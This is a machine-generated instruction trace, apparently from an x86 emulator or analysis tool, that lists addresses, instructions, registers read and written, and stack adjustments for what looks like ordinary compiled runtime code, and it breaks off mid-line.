mov dword ptr [ebp - 0xc], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0xe8 and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 4 0x41ab47: push edi, regs_read: [30, 23], regs_write: [30] 0x41ab48: push ebx, regs_read: [30, 21], regs_write: [30] 0x41ab49: push esi, regs_read: [30, 29], regs_write: [30] 0x41ab4a: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x41ab4d: push 1, regs_read: [30], regs_write: [30] 0x41ab4f: push dword ptr [ebp + 0x20], regs_read: [30, 20], regs_write: [30] 0x41ab62: push eax, regs_read: [30, 19], regs_write: [30] 0x41ab63: push eax, regs_read: [30, 19], regs_write: [30] 0x41ab64: push eax, regs_read: [30, 19], regs_write: [30] 0x41ab65: push eax, regs_read: [30, 19], regs_write: [30] 0x41ab66: push eax, regs_read: [30, 19], regs_write: [30] 0x41ab67: push edi, regs_read: [30, 23], regs_write: [30] 0x41ab68: push ebx, regs_read: [30, 21], regs_write: [30] 0x41ab69: push dword ptr [ebp + 0xc], regs_read: [30, 20], regs_write: [30] 0x41ab6c: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41ab75: mov esi, eax, regs_read: [19], regs_write: [29] 0x41ab7f: mov edx, 0x400, regs_read: (), regs_write: [24] 0x41ab89: mov eax, dword ptr [ebp + 0x1c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x124 and offset 0x801c for stack size 0x10000 0x41ab9c: push 0, regs_read: [30], regs_write: [30] 0x41ab9e: push 0, regs_read: [30], regs_write: [30] 0x41aba0: push 0, regs_read: [30], regs_write: [30] 0x41aba2: push eax, regs_read: [30, 19], regs_write: [30] 0x41aba3: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x41aba6: push edi, regs_read: [30, 23], regs_write: [30] 0x41aba7: push ebx, regs_read: [30, 21], regs_write: [30] 0x41aba8: push dword ptr [ebp + 0xc], regs_read: [30, 20], regs_write: [30] 0x41abab: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41abd0: mov edi, esp, regs_read: [30], regs_write: [23] adjusting stack for ESP -0x148 and offset 0x8000 for stack size 0x10000 0x41abd6: mov dword ptr [edi], 0xcccc, regs_read: [23], regs_write: () 0x41abde: push eax, regs_read: [30, 19], regs_write: [30] 0x41abe4: mov edi, eax, regs_read: [19], regs_write: [23] 0x41abe6: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41abeb: mov dword ptr [edi], 0xdddd, regs_read: [23], regs_write: () 0x41abf4: mov dword ptr [ebp - 8], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x148 and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x41abfb: push 0, regs_read: [30], regs_write: [30] 0x41abfd: push 0, regs_read: [30], regs_write: [30] 0x41abff: push 0, regs_read: [30], regs_write: [30] 0x41ac01: push esi, regs_read: [30, 29], regs_write: [30] 0x41ac02: push edi, regs_read: [30, 23], regs_write: [30] 0x41ac03: push dword ptr [ebp - 0x10], regs_read: [30, 20], regs_write: [30] 0x41ac06: push ebx, regs_read: [30, 21], regs_write: [30] 0x41ac07: push dword ptr [ebp + 0xc], regs_read: [30, 20], regs_write: [30] 0x41ac0a: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41ac19: push eax, regs_read: [30, 19], regs_write: [30] 0x41ac1a: push eax, regs_read: [30, 19], regs_write: [30] 0x41ac20: push eax, regs_read: [30, 19], regs_write: [30] 0x41ac21: push eax, regs_read: [30, 19], regs_write: [30] 0x41ac24: push dword ptr [ebp + 0x1c], regs_read: [30, 20], regs_write: [30] 0x41ac27: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x41ac2a: push esi, regs_read: [30, 29], regs_write: [30] 0x41ac2b: push edi, regs_read: [30, 23], regs_write: [30] 0x41ac2c: push eax, regs_read: [30, 19], regs_write: [30] 0x41ac2d: push dword ptr [ebp + 0x20], regs_read: [30, 20], regs_write: [30] 0x41ac36: mov esi, eax, regs_read: [19], regs_write: [29] 0x41ac56: mov eax, esi, regs_read: [29], regs_write: [19] 0x41ac5b: pop edi, regs_read: [30], regs_write: [30, 23] 0x41ac5c: pop esi, regs_read: [30], regs_write: [30, 29] 0x41ac5d: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41ac5e: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x188 and offset 0x7ffc for stack size 0x10000 0x41ac6a: push ebp, regs_read: [30, 20], regs_write: [30] 0x41ac6b: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x18c and offset 0x8000 for stack size 0x10000 0x41ac6d: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18c and offset 0x8008 for stack size 0x10000 0x41ac7f: push eax, regs_read: [30, 19], regs_write: [30] 0x41ac85: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41ac86: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41ac88: push ebp, regs_read: [30, 20], regs_write: [30] 0x41ac89: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x18c and offset 0x8000 for stack size 0x10000 0x41ac8b: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41ac94: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41ac96: push ebp, regs_read: [30, 20], regs_write: [30] 0x41ac97: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x190 and offset 0x8000 for stack size 0x10000 0x41ac99: push 0, regs_read: [30], regs_write: [30] 0x41ac9b: push 0xfa0, regs_read: [30], regs_write: [30] 0x41aca0: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41aca9: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41acab: push ebp, regs_read: [30, 20], regs_write: [30] 0x41acac: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x19c and offset 0x8000 for stack size 0x10000 0x41acae: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41acb7: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41acb9: push ebp, regs_read: [30, 20], regs_write: [30] 0x41acba: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x1a0 and offset 0x8000 for stack size 0x10000 0x41acbc: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41acc5: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41acc7: push ebp, regs_read: [30, 20], regs_write: [30] 0x41acc8: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x1a4 and offset 0x8000 for stack size 0x10000 0x41acca: push -1, regs_read: [30], regs_write: [30] 0x41accc: push 0x4c7bba, regs_read: [30], regs_write: [30] 0x41acd1: mov eax, dword ptr fs:[0], regs_read: [32], regs_write: [19] 0x41acd7: push eax, regs_read: [30, 19], regs_write: [30] 0x41acd8: push esi, regs_read: [30, 29], regs_write: [30] 0x41acd9: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x41ace0: push eax, regs_read: [30, 19], regs_write: [30] 0x41ace4: mov dword ptr fs:[0], eax, regs_read: [32, 19], regs_write: () 0x41acec: mov eax, dword ptr [ecx*4 + 0x4ef88c], regs_read: [22], regs_write: [19] 0x41acf4: push eax, regs_read: [30, 19], regs_write: [30] 0x41acf5: mov dword ptr [0x4eb040], ecx, regs_read: [22], regs_write: () 0x41ad01: mov esi, eax, regs_read: [19], regs_write: [29] 0x41ad07: mov ecx, esi, regs_read: [29], regs_write: [22] 0x41ad11: mov ecx, dword ptr [0x4eb040], regs_read: (), regs_write: [22] 0x41ad1c: mov ecx, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1bc and offset 0x7ff4 for stack size 0x10000 0x41ad1f: mov dword ptr fs:[0], ecx, regs_read: [32, 22], regs_write: () 0x41ad26: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41ad27: pop esi, regs_read: [30], regs_write: [30, 29] 0x41ad2f: push ebp, regs_read: [30, 20], regs_write: [30] 0x41ad30: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x1b8 and offset 0x8000 for stack size 0x10000 0x41ad3f: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41ad48: mov ecx, dword ptr [0x4eb040], regs_read: (), regs_write: [22] 0x41ad4f: mov dword ptr [0x4eb040], ecx, regs_read: [22], regs_write: () 0x41ad55: mov dword ptr [ecx*4 + 0x4ef88c], eax, regs_read: [22, 19], regs_write: () 0x41ad5c: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41ad5e: push ebp, regs_read: [30, 20], regs_write: [30] 0x41ad5f: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x1bc and offset 0x8000 for stack size 0x10000 0x41ad64: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x41ad6b: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1bc and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x41ad6e: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1bc and offset 0x8008 for stack size 0x10000 0x41ad71: push ebx, regs_read: [30, 21], regs_write: [30] 0x41ad72: push esi, regs_read: [30, 29], regs_write: [30] 0x41ad73: mov esi, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x1c4 and offset 0x8010 for stack size 0x10000 0x41ad76: push edi, regs_read: [30, 23], regs_write: [30] 0x41ad77: mov edi, dword ptr [ebp + 0x14], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1c8 and offset 0x8014 for stack size 0x10000 0x41ad7a: mov dword ptr [ebp - 0x34], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c8 and offset 0x7fcc for stack size 0x10000 saving data to stack: 0 4 0x41ad7d: mov eax, dword ptr [ebp + 0x18], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c8 and offset 0x8018 for stack size 0x10000 0x41ad80: mov dword ptr [ebp - 0x1c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x1c8 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 0 4 0x41ad83: mov dword ptr [ebp - 0x20], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c8 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 4 0x41ad8a: push edi, regs_read: [30, 23], regs_write: [30] 0x41ad8b: push esi, regs_read: [30, 29], regs_write: [30] 0x41ad91: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41ad92: mov edi, eax, regs_read: [19], regs_write: [23] 0x41ad94: mov eax, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1cc and offset 0x7fe0 for stack size 0x10000 0x41ad97: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41ada3: mov ebx, dword ptr [ebp + 0x1c], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x1c8 and offset 0x801c for stack size 0x10000 0x41adaa: push ebx, regs_read: [30, 21], regs_write: [30] 0x41adab: push eax, regs_read: [30, 19], regs_write: [30] 0x41adb1: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41adb2: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41adb3: mov ebx, eax, regs_read: [19], regs_write: [21] 0x41ade5: push eax, regs_read: [30, 19], regs_write: [30] 0x41ade6: push dword ptr [ebp + 0x20], regs_read: [30, 20], regs_write: [30] 0x41ae0a: mov cl, byte ptr [eax + 1], regs_read: [19], regs_write: [10] 0x41ae11: mov dl, byte ptr [esi], regs_read: [29], regs_write: [16] 0x41ae27: push 3, regs_read: [30], regs_write: [30] 0x41ae29: pop eax, regs_read: [30], regs_write: [30, 19] 0x41ae42: mov edi, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1d0 and offset 0x7fe0 for stack size 0x10000 0x41ae45: mov cl, byte ptr [eax + 1], regs_read: [19], regs_write: [10] 0x41ae4c: mov dl, byte ptr [edi], regs_read: [23], regs_write: [16] 0x41ae6c: push esi, regs_read: [30, 29], regs_write: [30] 0x41ae6d: push esi, regs_read: [30, 29], regs_write: [30] 0x41ae6e: push edi, regs_read: [30, 23], regs_write: [30] 0x41ae6f: push dword ptr [ebp - 0x1c], regs_read: [30, 20], regs_write: [30] 0x41ae72: push 9, regs_read: [30], regs_write: [30] 0x41ae74: push dword ptr [ebp + 0x20], regs_read: [30, 20], regs_write: [30] 0x41ae7d: mov dword ptr [ebp - 0x28], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x7fd8 for stack size 0x10000 saving data to stack: 0 4 0x41aea6: mov eax, esp, regs_read: [30], regs_write: [19] adjusting stack for ESP -0x1e8 and offset 0x8000 for stack size 0x10000 0x41aea8: mov dword ptr [ebp - 0x24], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x7fdc for stack size 0x10000 saving data to stack: 0 4 0x41aeaf: mov dword ptr [eax], 0xcccc, regs_read: [19], regs_write: () 0x41aeb7: push eax, regs_read: [30, 19], regs_write: [30] 0x41aebd: mov dword ptr [ebp - 0x24], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1ec and offset 0x7fdc for stack size 0x10000 saving data to stack: 0 4 0x41aec0: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41aec5: mov dword ptr [eax], 0xdddd, regs_read: [19], regs_write: () 0x41aece: mov dword ptr [ebp - 0x24], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x7fdc for stack size 0x10000 saving data to stack: 0 4 0x41aed1: mov dword ptr [ebp - 0x30], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1e8 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 4 0x41aedc: push dword ptr [ebp - 0x28], regs_read: [30, 20], regs_write: [30] 0x41aedf: push eax, regs_read: [30, 19], regs_write: [30] 0x41aee0: push edi, regs_read: [30, 23], regs_write: [30] 0x41aee1: push dword ptr [ebp - 0x1c], regs_read: [30, 20], regs_write: [30] 0x41aee4: push 1, regs_read: [30], regs_write: [30] 0x41aee6: push dword ptr [ebp + 0x20], regs_read: [30, 20], regs_write: [30] 0x41aef7: mov edi, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x200 and offset 0x7fe0 for stack size 0x10000 0x41aefa: push esi, regs_read: [30, 29], regs_write: [30] 0x41aefb: push esi, regs_read: [30, 29], regs_write: [30] 0x41aefc: push ebx, regs_read: [30, 21], regs_write: [30] 0x41aefd: push edi, regs_read: [30, 23], regs_write: [30] 0x41aefe: push 9, regs_read: [30], regs_write: [30] 0x41af00: push dword ptr [ebp + 0x20], regs_read: [30, 20], regs_write: [30] 0x41af09: mov dword ptr [ebp - 0x1c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x218 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 0 4 0x41af2e: mov edi, esp, regs_read: [30], regs_write: [23] adjusting stack for ESP -0x218 and offset 0x8000 for stack size 0x10000 0x41af34: mov dword ptr [edi], 0xcccc, regs_read: [23], regs_write: () 0x41af3c: push eax, regs_read: [30, 19], regs_write: [30] 0x41af42: mov edi, eax, regs_read: [19], regs_write: [23] 0x41af44: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41af49: mov dword ptr [edi], 0xdddd, regs_read: [23], regs_write: () 0x41af52: mov dword ptr [ebp - 0x2c], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x218 and offset 0x7fd4 for stack size 0x10000 saving data to stack: 0 4 0x41af59: push dword ptr [ebp - 0x1c], regs_read: [30, 20], regs_write: [30] 0x41af5c: push edi, regs_read: [30, 23], regs_write: [30] 0x41af5d: push ebx, regs_read: [30, 21], regs_write: [30] 0x41af5e: push dword ptr [ebp - 0x20], regs_read: [30, 20], regs_write: [30] 0x41af61: push 1, regs_read: [30], regs_write: [30] 0x41af63: push dword ptr [ebp + 0x20], regs_read: [30, 20], regs_write: [30] 0x41af70: push esi, regs_read: [30, 29], regs_write: [30] 0x41af71: push esi, regs_read: [30, 29], regs_write: [30] 0x41af72: push esi, regs_read: [30, 29], regs_write: [30] 0x41af73: push dword ptr [ebp - 0x1c], regs_read: [30, 20], regs_write: [30] 0x41af76: push edi, regs_read: [30, 23], regs_write: [30] 0x41af77: push dword ptr [ebp - 0x28], regs_read: [30, 20], regs_write: [30] 0x41af7a: push dword ptr [ebp - 0x24], regs_read: [30, 20], regs_write: [30] 0x41af7d: push dword ptr [ebp + 0xc], regs_read: [30, 20], regs_write: [30] 0x41af80: push dword ptr [ebp - 0x34], regs_read: [30, 20], regs_write: [30] 0x41af89: mov esi, eax, regs_read: [19], regs_write: [29] 0x41af8d: mov dword ptr [ebp - 0x2c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x254 and offset 0x7fd4 for stack size 0x10000 saving data to stack: 0 4 0x41af9a: mov dword ptr [ebp - 0x30], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x254 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 4 0x41afa5: mov eax, esi, regs_read: [29], regs_write: [19] 0x41afa9: push 2, regs_read: [30], regs_write: [30] 0x41afb5: pop edi, regs_read: [30], regs_write: [30, 23] 0x41afb6: pop esi, regs_read: [30], regs_write: [30, 29] 0x41afb7: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41afb8: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x24c and offset 0x7ffc for stack size 0x10000 0x41afc4: push esi, regs_read: [30, 29], regs_write: [30] 0x41afc5: push 0x4c8a50, regs_read: [30], regs_write: [30] 0x41afd0: mov esi, eax, regs_read: [19], regs_write: [29] 0x41afd2: push 0x4c9a5c, regs_read: [30], regs_write: [30] 0x41afd7: push esi, regs_read: [30, 29], regs_write: [30] 0x41afde: push 0x4c9a70, regs_read: [30], regs_write: [30] 0x41afe3: push esi, regs_read: [30, 29], regs_write: [30] 0x41afe4: mov dword ptr [0x4ef928], eax, regs_read: [19], regs_write: () 0x41afef: push 0x4c8a6c, regs_read: [30], regs_write: [30] 0x41aff4: push esi, regs_read: [30, 29], regs_write: [30] 0x41aff5: mov dword ptr [0x4ef92c], eax, regs_read: [19], regs_write: () 0x41b000: mov dword ptr [0x4ef930], eax, regs_read: [19], regs_write: () 0x41b007: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b009: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b00a: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x26c and offset 0x8000 for stack size 0x10000 0x41b00c: push esi, regs_read: [30, 29], regs_write: [30] 0x41b00d: mov esi, dword ptr [0x4ef92c], regs_read: (), regs_write: [29] 0x41b013: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41b01a: mov ecx, esi, regs_read: [29], regs_write: [22] 0x41b02c: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b02d: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b02f: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b030: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x270 and offset 0x8000 for stack size 0x10000 0x41b034: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41b03c: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b041: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41b049: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b04e: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b05f: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b060: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x270 and offset 0x8000 for stack size 0x10000 0x41b062: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x270 and offset 0x8008 for stack size 0x10000 0x41b065: push esi, regs_read: [30, 29], regs_write: [30] 0x41b066: mov ecx, dword ptr [eax + 0x3c], regs_read: [19], regs_write: [22] 0x41b081: mov ecx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x274 and offset 0x800c for stack size 0x10000 0x41b089: mov eax, dword ptr [edx + 8], regs_read: [24], regs_write: [19] 0x41b09c: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b09d: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b09f: mov eax, edx, regs_read: [24], regs_write: [19] 0x41b0a3: push esi, regs_read: [30, 29], regs_write: [30] 0x41b0ad: mov eax, dword ptr fs:[0x18], regs_read: [32], regs_write: [19] 0x41b0b3: mov esi, 0x4ef938, regs_read: (), regs_write: [29] 0x41b0b8: mov edx, dword ptr [eax + 4], regs_read: [19], regs_write: [24] 0x41b0c3: mov ecx, edx, regs_read: [24], regs_write: [22] 0x41b0cf: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b0d1: mov al, 1, regs_read: (), regs_write: [2] 0x41b0d3: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b0d5: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b0d6: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x26c and offset 0x8000 for stack size 0x10000 0x41b0de: mov byte ptr [0x4ef93c], 1, regs_read: (), regs_write: () 0x41b0f5: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b100: push 0, regs_read: [30], regs_write: [30] 0x41b107: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b10a: mov al, 1, regs_read: (), regs_write: [2] 0x41b10c: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b10e: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b10f: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x268 and offset 0x8000 for stack size 0x10000 0x41b11a: mov al, 1, regs_read: (), regs_write: [2] 0x41b11c: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b11e: push esi, regs_read: [30, 29], regs_write: [30] 0x41b11f: mov esi, dword ptr [ebp + 8], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x268 and offset 0x8008 for stack size 0x10000 0x41b138: push 0x4ef940, regs_read: [30], regs_write: [30] 0x41b142: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b147: push 0x4ef94c, regs_read: [30], regs_write: [30] 0x41b151: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b15d: mov dword ptr [0x4ef940], ecx, regs_read: [22], regs_write: () 0x41b163: mov dword ptr [0x4ef944], ecx, regs_read: [22], regs_write: () 0x41b169: mov dword ptr [0x4ef948], ecx, regs_read: [22], regs_write: () 0x41b16f: mov dword ptr [0x4ef94c], ecx, regs_read: [22], regs_write: () 0x41b175: mov dword ptr [0x4ef950], ecx, regs_read: [22], regs_write: () 0x41b17b: mov dword ptr [0x4ef954], ecx, regs_read: [22], regs_write: () 0x41b181: mov byte ptr [0x4ef93d], 1, regs_read: (), regs_write: () 0x41b188: mov al, 1, regs_read: (), regs_write: [2] 0x41b18a: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b18b: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b18d: push 5, regs_read: [30], regs_write: [30] 0x41b195: push 8, regs_read: [30], regs_write: [30] 0x41b197: push 0x4e8608, regs_read: [30], regs_write: [30] 0x41b1a5: mov eax, 0x5a4d, regs_read: (), regs_write: [19] 0x41b1b3: mov eax, dword ptr [0x40003c], regs_read: (), regs_write: [19] 0x41b1c4: mov ecx, 0x10b, regs_read: (), regs_write: [22] 0x41b1d2: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x26c and offset 0x8008 for stack size 0x10000 0x41b1d5: mov ecx, 0x400000, regs_read: (), regs_write: [22] 0x41b1dc: push eax, regs_read: [30, 19], regs_write: [30] 0x41b1dd: push ecx, regs_read: [30, 22], regs_write: [30] 0x41b1e3: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b1e4: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b1ef: mov dword ptr [ebp - 4], 0xfffffffe, regs_read: [20], regs_write: () adjusting stack for ESP -0x26c and offset 0x7ffc for stack size 0x10000 saving data to stack: 4294967294 4 0x41b1f6: mov al, 1, regs_read: (), regs_write: [2] 0x41b1fa: mov eax, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x26c and offset 0x7fec for stack size 0x10000 0x41b1fd: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x41b20a: mov eax, ecx, regs_read: [22], regs_write: [19] 0x41b20d: mov esp, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [30] adjusting stack for ESP -0x26c and offset 0x7fe8 for stack size 0x10000 0x41b210: mov dword ptr [ebp - 4], 0xfffffffe, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 4294967294 4 0x41b219: mov ecx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x41b21c: mov dword ptr fs:[0], ecx, regs_read: [32, 22], regs_write: () 0x41b223: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b224: pop edi, regs_read: [30], regs_write: [30, 23] 0x41b225: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b226: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41b229: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b22a: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0xc and offset 0x8000 for stack size 0x10000 0x41b23d: mov ecx, 0x4ef938, regs_read: (), regs_write: [22] 0x41b244: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b246: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b247: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0xc and offset 0x8000 for stack size 0x10000 0x41b258: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41b260: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41b268: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b269: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b26a: mov al, 1, regs_read: (), regs_write: [2] 0x41b26c: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b26e: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b26f: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0xc and offset 0x8000 for stack size 0x10000 0x41b278: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41b284: push 0x4ef940, regs_read: [30], regs_write: [30] 0x41b28e: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b291: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b299: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b29b: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b29c: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0xc and offset 0x8000 for stack size 0x10000 0x41b29e: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41b2a8: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b2ae: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b2b0: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b2b1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0xc and offset 0x8000 for stack size 0x10000 0x41b2b3: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41b2bb: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b2bc: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b2be: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b2bf: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0xc and offset 0x8000 for stack size 0x10000 0x41b2c1: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b2c7: push ebp, regs_read: [30, 20], regs_write: [30] 0x41b2c8: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0xc and offset 0x8000 for stack size 0x10000 0x41b2ce: push esi, regs_read: [30, 29], regs_write: [30] 0x41b2cf: mov esi, ecx, regs_read: [22], regs_write: [29] 0x41b2d1: mov dword ptr [esi], 0x4c9a94, regs_read: [29], regs_write: () 0x41b2d9: push 0xc, regs_read: [30], regs_write: [30] 0x41b2db: push esi, regs_read: [30, 29], regs_write: [30] 0x41b2e1: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b2e2: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b2e3: mov eax, esi, regs_read: [29], regs_write: [19] 0x41b2e5: pop esi, regs_read: [30], regs_write: [30, 29] 0x41b2e6: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41b2f4: push 0, regs_read: [30], regs_write: [30] 0x41b2fb: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b300: push 0x41b398, regs_read: [30], regs_write: [30] 0x41b30a: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41b30e: push 7, regs_read: [30], regs_write: [30] 0x41b316: push esi, regs_read: [30, 29], regs_write: [30] 0x41b317: push edi, regs_read: [30, 23], regs_write: [30] 0x41b318: push 0xfa0, regs_read: [30], regs_write: [30] 0x41b31d: push 0x4ef960, regs_read: [30], regs_write: [30] 0x41b328: push 0x4c9a98, regs_read: 